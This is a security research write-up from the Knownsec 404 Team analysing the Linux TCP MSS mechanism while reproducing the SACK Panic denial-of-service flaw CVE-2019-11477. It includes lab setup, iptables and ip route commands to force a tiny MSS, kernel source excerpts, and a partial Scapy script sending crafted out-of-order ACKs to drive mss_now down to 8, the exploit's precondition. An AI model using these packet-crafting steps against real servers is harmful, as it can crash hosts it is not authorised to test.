**Author: Hcamael@Knownsec 404 Team**  
**Chinese Version:<https://paper.seebug.org/966/>**

# Overview

Last Week, Linux fixes 4 kernel CVE vulnerabilities[1]. Among them,
CVE-2019-11477 makes me feel like a very powerful Dos vulnerability. However,
because there are other things interrupted, my research progress is slower.
For now, there have been some related analysis article in the Internet.[2][3]

In the process of trying to reproduce the CVE-2019-11477 vulnerability, I
encountered a problem in setting the MSS in the first step, and I could not
achieve the expected results. However, the current published analytical
article did not elaborate on this part. So this article will analyze the MSS
mechanism of TCP through the Linux kernel source code.

# Test Environment

##### 1\. Targets with Vulnerabilities

OS: Ubuntu 18.04

Kernel: 4.15.0-20-generic

IP address: 192.168.11.112

Kernel Source Code:

    
    
    $ sudo apt install linux-source-4.15.0
    $ ls /usr/src/linux-source-4.15.0.tar.bz2

Kernel Binary with symbols:

    
    
    $ cat /etc/apt/sources.list.d/ddebs.list
    deb http://ddebs.ubuntu.com/ bionic main
    deb http://ddebs.ubuntu.com/ bionic-updates main
    $ sudo apt install linux-image-4.15.0-20-generic-dbgsym
    $ ls /usr/lib/debug/boot/vmlinux-4.15.0-20-generic

Close Kernel Address Space Layout Randomization(KALSR):

    
    
    # because the Kernel is started by grup，we can modify grup config to add "nokaslr" to kernel started argv.
    $ cat /etc/default/grub |grep -v "#" | grep CMDLI
    GRUB_CMDLINE_LINUX_DEFAULT="nokaslr"
    GRUB_CMDLINE_LINUX=""
    $ sudo update-grub

Use Nginx for testing:

    
    
    $ sudo apt install nginx

##### 2\. Host

OS: MacOS

Wireshark: Capture traffic

VM: VMware Fusion 11

Use VM to Deubg Linux:

    
    
    $ cat ubuntu_18.04_server_test.vmx|grep debug
    debugStub.listen.guest64 = "1"

Compile gdb：

    
    
    $ ./configure --build=x86_64-apple-darwin --target=x86_64-linux --with-python=/usr/local/bin/python3
    $ make
    $ sudo make install
    $ cat .zshrc|grep gdb
    alias gdb="~/Documents/gdb_8.3/gdb/gdb"

Use gdb for remote debug：

    
    
    $ gdb vmlinux-4.15.0-20-generic
    $ cat ~/.gdbinit
    define gef
    source ~/.gdbinit-gef.py
    end
    
    define kernel
    target remote :8864
    end

##### 3\. Attacker

OS: Linux

IP Address: 192.168.11.111

If you're accustomed to Python, install a Scapy to send TCP package.

# Customize SYN MSS Option

There are three ways to set the MSS value of the TCP SYN packet.

##### 1\. iptable

    
    
    # Add rules
    $ sudo iptables -I OUTPUT -p tcp -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --set-mss 48
    # delete rules
    $ sudo iptables -D OUTPUT -p tcp -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --set-mss 48

##### 2\. ip route

    
    
    # show router information
    $ route -ne
    $ ip route show
    192.168.11.0/24 dev ens33 proto kernel scope link src 192.168.11.111 metric 100
    # modify route table
    $ sudo ip route change 192.168.11.0/24 dev ens33 proto kernel scope link src 192.168.11.111 metric 100 advmss 48

##### 3\. use scapy to send packet

PS: Using Scapy to send TCP packet needs ROOT permissions.

    
    
    from scapy.all import *
    
    ip = IP(dst="192.168.11.112")
    tcp = TCP(dport=80, flags="S",options=[('MSS',48),('SAckOK', '')])

The "S" in the flags option indicates "SYN"; "A" indicates "ACK" and "SA"
indicates "SYN, ACK".

The TCP options table that can be set via Scapy is as follows:

    
    
    TCPOptions = (
    { 
        0 : ("EOL",None),
        1 : ("NOP",None),
        2 : ("MSS","!H"),
        3 : ("WScale","!B"),
        4 : ("SAckOK",None),
        5 : ("SAck","!"),
        8 : ("Timestamp","!II"),
        14 : ("AltChkSum","!BH"),
        15 : ("AltChkSumOpt",None),
        25 : ("Mood","!p"),
        254 : ("Experiment","!HHHH")
    },
    { 
        "EOL":0,
        "NOP":1,
        "MSS":2,
        "WScale":3,
        "SAckOK":4,
        "SAck":5,
        "Timestamp":8,
        "AltChkSum":14,
        "AltChkSumOpt":15,
        "Mood":25,
        "Experiment":254
    })

But there will be a problem after sending a SYN package with Python: kernel
will automatically send a RST packet. After checking some papers, it's found
out that:

> Since you haven't completed the full TCP handshake, your operating system
> might try to take control and start sending RST(reset) packets.

The solution is to use iptable to filter the RST package:

    
    
    $ sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.11.111 -j DROP

# In-depth Research of the MSS Mechanism

The details of the vulnerability have been analyzed in many other articles.
Here is a brief summary that the vulnerability is a uint16 integer overflow:

    
    
    tcp_gso_segs uint16
    
    tcp_set_skb_tso_segs:
    tcp_skb_pcount_set(skb, DIV_ROUND_UP(skb->len, mss_now));
    skb->len the largest value is 17 * 32 * 1024
    mss_now minimum value is 8
    
    
    >>> hex(17*32*1024//8)
    '0x11000'
    >>> hex(17*32*1024//9)
    '0xf1c7'

Therefore, an integer overflow will occur only when mss_now is less than or
equal to 8.

Having conducted the following test, I met a problem.

Having set the MSS value to 48 via `iptables/iproute` command , the attack
machine uses curl to request the HTTP service of the Target machine, and then
the Host use wireshark to capture traffic. It is found that the HTTP packet
returned by the server is divided into small blocks, but it's only as small as
36, and my expected value is 8.

![](https://images.seebug.org/content/images/2019/06/7d87c56b-7652-4527-8152-7621ff636a72.png-w331s)

At this time, I chose to analyse and debug Linux Kernel source code to sort
out the reason why the MSS failed to reach my expected value, and what
happened during the process of setting the MSS value in the SYN packet to
mss_now in the code.

Backtrack the overflow function `tcp_set_skb_tso_segs`:

    
    
    tcp_set_skb_tso_segs <- tcp_fragment <- tso_fragment <- tcp_write_xmit
    
    Finally, it is found that the 'mss_now' passed to the 'tcp_write_xmit' function is calculated by the 'tcp_current_mss' function.

Analyse `tcp_current_mss` function and the key code is as follows:

    
    
    # tcp_output.c
    tcp_current_mss -> tcp_sync_mss:
    mss_now = tcp_mtu_to_mss(sk, pmtu);
    
    tcp_mtu_to_mss:
    /* Subtract TCP options size, not including SACKs */
    return __tcp_mtu_to_mss(sk, pmtu) -               (tcp_sk(sk)->tcp_header_len - sizeof(struct tcphdr));
    
    __tcp_mtu_to_mss:
    if (mss_now < 48)
        mss_now = 48;
    return mss_now;

Having read the part of the source code, we will have a deeper understanding
of the meaning of MSS. Firstly, we need know the TCP protocol.

The TCP protocol includes protocol headers and data. The protocol header
includes fixed-length 20-byte and 40-byte optional parameters. That is to say,
the TCP protocol header has a maximum length of 60 bytes and a minimum length
of 20 bytes.

The `mss_now` in the `__tcp_mtu_to_mss` function is the MSS set for SYN
package, from which we can see that the minimum MSS is 48. Through the
understanding of the TCP protocol as well as the code, we can know about the
MSS in the SYN packet. The minimum value of 48 bytes indicates that the TCP
header optional parameter has a maximum length of 40 bytes and the minimum
length of data is 8 bytes.

But `mss_now` in the source code represents the length of the data, then let's
look at the calculation formula of the value.

tcphdr struct：

    
    
    struct tcphdr {
        __be16  source;
        __be16  dest;
        __be32  seq;
        __be32  ack_seq;
    #if defined(__LITTLE_ENDIAN_BITFIELD)
        __u16   res1:4,
            doff:4,
            fin:1,
            syn:1,
            rst:1,
            psh:1,
            ack:1,
            urg:1,
            ece:1,
            cwr:1;
    #elif defined(__BIG_ENDIAN_BITFIELD)
        __u16   doff:4,
            res1:4,
            cwr:1,
            ece:1,
            urg:1,
            ack:1,
            psh:1,
            rst:1,
            syn:1,
            fin:1;
    #else
    #error  "Adjust your <asm/byteorder.h> defines"
    #endif  
        __be16  window;
        __sum16 check;
        __be16  urg_ptr;
    };

This structure is a 20-byte TCP fixed protocol header.

The variable `tcp_sk(sk)->tcp_header_len` indicates the length of the TCP
packet header sent by the local machine.

Therefore, we can get the formula for calculating `mss_now`: the MSS value set
by the SYN packet - (The length of the TCP packet header sent by the local
machine - the fixed length of the TCP header is 20 bytes)

So, if the value of `tcp_header_len` can reach a maximum of 60, then `mss_now`
can be set to 8. So in the kernel code, is there any way to make
`tcp_header_len` reach the maximum length? Then we backtrack this variable:

    
    
    # tcp_output.c
    tcp_connect_init:
    tp->tcp_header_len = sizeof(struct tcphdr);
        if (sock_net(sk)->ipv4.sysctl_tcp_timestamps)
            tp->tcp_header_len += TCPOLEN_TSTAMP_ALIGNED;
    
    #ifdef CONFIG_TCP_MD5SIG
        if (tp->af_specific->md5_lookup(sk, sk))
            tp->tcp_header_len += TCPOLEN_MD5SIG_ALIGNED;
    #endif

Therefore, in the Linux 4.15 kernel, the kernel does not send TCP packets with
a header size of 60 bytes without user intervention, which resulted in that
the MSS cannot be set to a minimum of 8, thus ultimately prevented the
vulnerability from being exploited.

# Summary

Let's summarize the whole process:

  1. Attacker constructs a SYN packet, and the optional TCP header optional parameter has a value of 48 for the MSS.

  2. After the Target(vulnerable devices) receives the SYN request, it saves the data in the SYN packet in the memory and returns to the 'SYN" and the "ACK' packets.

  3. Attacker returns an ACK packet.

Complete the 3-way handshake process.

Then according to different services, the target actively sends data to the
attacker or sends the data to the attacker after receiving the attacker
request. Here, it is assumed to be an Nginx HTTP service.

~~1\. The attacker sends a request to the target:`GET / HTTP/1.1`.~~

~~2\. After receiving the request, the target firstly calculates
tcp_header_len, which is equal to 20 bytes by default. When the kernel
parameters sysctl_tcp_timestamps is enabled, 12 bytes are added. If you
selected CONFIG_TCP_MD5SIG when compiling the kernel, another 18 bytes will be
added, which means that the maximum length of tcp_header_len is 50 bytes.~~

~~3\. Then you will calculate mss_now = 48 - 50 + 20 = 18~~

~~It is assumed that the vulnerability might be exploited successfully under
such circumstances: there is a TCP service that sets the TCP optional
parameters to the full 40 bytes, then it is possible for an attacker to
perform a Dos attack on the service by constructing the MSS value in the SYN
packet.~~

~~I audited the Linux kernel from 2.6.29 to the present version, and the
calculation formula of mss_now is the same. The length of tcp_header_len will
only add 12 bytes of the timestamp and 18 bytes of the md5 value.~~

\----- 2019/07/03 UPDATE -----
Thanks for @riatre to correct me. I found that the above analysis of the
tcp_current_mss function had missed an important piece of code:

    
    
    # tcp_output.c
    tcp_current_mss -> tcp_sync_mss:
    mss_now = tcp_mtu_to_mss(sk, pmtu);
    header_len = tcp_established_options(sk, NULL, &opts, &md5) + 
                sizeof(struct tcphdr);
    if (header_len != tp->tcp_header_len) {
        int delta = (int) header_len - tp->tcp_header_len;
        mss_now -= delta;
    }

In the code of the `tcp_established_options` function, apart from the 12-byte
timestamp and the 20-byte md5, there is still the calculation of the SACK
length. If the length does not exceed the 40-byte limit of the tcp option, the
formula is: `Size = 4 + 8 * opts->num_sack_blocks`.

    
    
    eff_sacks = tp->rx_opt.num_sacks + tp->rx_opt.dsack;
    if (unlikely(eff_sacks)) {
        const unsigned int remaining = MAX_TCP_OPTION_SPACE - size;
        opts->num_sack_blocks =
            min_t(unsigned int, eff_sacks,
                  (remaining - TCPOLEN_SACK_BASE_ALIGNED) /
                  TCPOLEN_SACK_PERBLOCK);
        size += TCPOLEN_SACK_BASE_ALIGNED +
            opts->num_sack_blocks * TCPOLEN_SACK_PERBLOCK;
    }

So the method of getting 40 bytes tcp options is: `12-byte timestamp + 8 * 3
(opts->num_sack_blocks)`.

The variable `opts->num_sack_blocks` indicates the number of packets lost from
the peer.

So here the process of the last three steps in the summary are modified as
follows:

The attacker sends a normal HTTP request to the drone.

After receiving the request, the target will send a HTTP response packet. As
shown in the screenshot above, the response packet will be divided into
multiple segments according to the length of 36 bytes.

The attacker constructs a serial queue with a missing ACK packet (the ACK
packet needs to carry some data).

After receiving the unordered ACK packet, the server finds that packet loss
has occurred. Therefore, in the subsequent data packet, the SACK option is
brought to tell the client that those packets are lost until the TCP link is
disconnected or a packet receives a response sequence.

Results are shown below:

![](https://images.seebug.org/content/images/2019/07/1e4d7928-c9c4-4b95-a9e3-8e1c28a3b9ea.png-w331s)

Because the timestamp is counted, the TCP SACK option can only contain up to 3
sequence numbers, so you can set the MSS to 8 by sending 4 ACK packets.

Part of the scapy code is as follows:

    
    
    data = "GET / HTTP/1.1\nHost: 192.168.11.112\r\n\r\n"
    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
    ACK.options = [("NOP",None), ("NOP",None), ('Timestamp', (1, 2))]
    send(ip/ACK/data)
    dl = len(data)
    test = "a"*10
    ACK.seq += dl + 20
    ACK.ack = SYNACK.seq+73
    send(ip/ACK/test)
    ACK.seq += 30
    ACK.ack = SYNACK.seq+181
    send(ip/ACK/test)
    ACK.seq += 30
    ACK.ack = SYNACK.seq+253
    send(ip/ACK/test)

Now having satisfied the premise of mss_now=8, I will conduct futher analysis
to the vulnerability.

# 参考

  1. <https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001.md>
  2. <https://paper.seebug.org/959/>
  3. <https://paper.seebug.org/960/>

# About Knownsec & 404 Team

Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.

Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.

404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.

The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/967/>

